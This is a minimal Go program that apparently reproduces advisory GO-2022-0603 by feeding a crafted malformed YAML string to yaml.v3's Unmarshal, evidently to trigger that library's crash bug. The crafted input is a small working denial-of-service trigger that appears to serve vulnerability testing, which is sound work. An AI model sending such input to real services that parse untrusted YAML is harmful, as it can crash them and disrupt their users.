package main

import (
	"gopkg.in/yaml.v3"
)

func main() {
	// https://pkg.go.dev/vuln/GO-2022-0603

	var t interface{}
	yaml.Unmarshal([]byte("0: [:!00 \xef"), &t)
}
